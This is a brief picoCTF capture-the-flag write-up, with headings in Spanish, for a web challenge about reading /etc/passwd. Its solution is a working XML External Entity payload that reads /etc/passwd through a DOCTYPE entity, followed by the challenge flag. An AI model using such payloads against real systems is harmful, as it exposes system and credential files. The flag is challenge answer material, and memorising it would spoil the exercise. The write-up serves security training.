## Descripción 
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

[Web Portal](http://saturn.picoctf.net:55596/)
## Solución 
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```
picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4}
## Notas adicionales 
*  De esta manera se puede encontrar una vulnerabilidad usando burpsuite
## Referencias
* deepseek